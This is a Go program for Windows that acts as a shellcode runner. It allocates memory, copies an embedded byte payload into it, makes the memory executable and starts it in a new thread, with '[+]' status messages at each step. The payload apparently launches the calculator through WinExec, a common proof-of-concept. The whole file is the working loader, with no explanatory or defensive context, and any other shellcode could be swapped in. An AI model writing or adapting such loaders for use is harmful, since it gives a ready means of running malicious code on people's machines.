package main

import (
    "fmt"
    "unsafe"
    "syscall"
)

var (
    kernel32            = syscall.NewLazyDLL("kernel32.dll")
    virtualalloc        = kernel32.NewProc("VirtualAlloc")
    virtualprotect      = kernel32.NewProc("VirtualProtect")
    createthread        = kernel32.NewProc("CreateThread")
    waitforsingleobject = kernel32.NewProc("WaitForSingleObject")
)

const (
    memCommit           = 0x00001000
    memReserve          = 0x00002000
    pageReadWrite       = 0x04
    pageExecuteReadWrite = 0x40
    infinite             = 0xFFFFFFFF
)

func main() {
    shellcode := []byte{
        0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
        0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
        0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
        0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
        0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
        0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
        0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
    }

    fmt.Println("[+] Memory Allocation Being Performed")
    addr, _, err := virtualalloc.Call(0, uintptr(len(shellcode)), memCommit|memReserve, pageReadWrite)
    if addr == 0 {
        panic(fmt.Sprintf("[!] VirtualAlloc failed: %v", err))
    }

    fmt.Println("[+] Copying Shellcode To Target Memory")
    for i, v := range shellcode {
        *(*byte)(unsafe.Pointer(addr + uintptr(i))) = v
    }

    fmt.Println("[+] Changing Page Permissions")
    var oldProtect uint32
    _, _, err = virtualprotect.Call(addr, uintptr(len(shellcode)), pageExecuteReadWrite, uintptr(unsafe.Pointer(&oldProtect)))
    if err != nil && err.(syscall.Errno) != 0 {
        panic(fmt.Sprintf("[!] VirtualProtect failed: %v", err))
    }

    fmt.Println("[+] Thread Being Created")
    thread, _, err := createthread.Call(0, 0, addr, 0, 0, 0)
    if thread == 0 {
        panic(fmt.Sprintf("[!] CreateThread failed: %v", err))
    }

    fmt.Println("[+] Shellcode Executed!")
    waitforsingleobject.Call(thread, infinite)
}
